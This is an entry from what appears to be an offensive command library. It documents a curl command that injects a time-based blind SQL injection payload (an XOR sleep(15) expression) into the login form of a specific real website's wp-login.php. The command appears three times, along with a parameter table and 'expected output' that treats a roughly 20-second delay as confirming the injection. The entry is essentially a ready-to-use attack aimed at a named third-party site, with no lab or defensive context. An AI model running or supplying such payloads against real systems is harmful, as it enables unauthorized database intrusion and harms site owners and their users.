---
id: cmd-curl-sleep-15-001
data: >-
  curl -X POST https://www.acronis.cz/wp-login.php -d
  "log=0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z&pwd=test&wp-submit=Log+In" -w
  "%{time_total}s"
tags:
  - sqli
  - blind-sqli
type: command
output: Delayed response time of approximately 20.002 seconds.
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:09.883Z'
verified: false
validated: true
submitted: true
---
# curl-inject-sleep-15

## Command

```bash
curl -X POST https://www.acronis.cz/wp-login.php -d "log=0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z&pwd=test&wp-submit=Log+In" -w "%{time_total}s"
```

## Description

Injects a 15-second sleep payload into the log parameter to test for time-based blind SQLi.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-d` | Payload in log, with XOR for query balancing | Yes |
| `-w "%{time_total}s"` | Time measurement | Yes |
| `sleep(15)` | Delays if vulnerable | Yes |
| `now()=sysdate()` | MySQL version check | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.acronis.cz/wp-login.php -d "log=0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z&pwd=test&wp-submit=Log+In" -w "%{time_total}s"
```

### Advanced Usage

```bash
curl -s -X POST https://www.acronis.cz/wp-login.php -d "log=0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z&pwd=test&wp-submit=Log+In" -w "%{time_total}s"
```

## Expected Output

Time output like 20.002s, indicating successful injection.

## Related

- [[Related Procedure: Inject Time-Based Blind SQLi Payload into Log]]
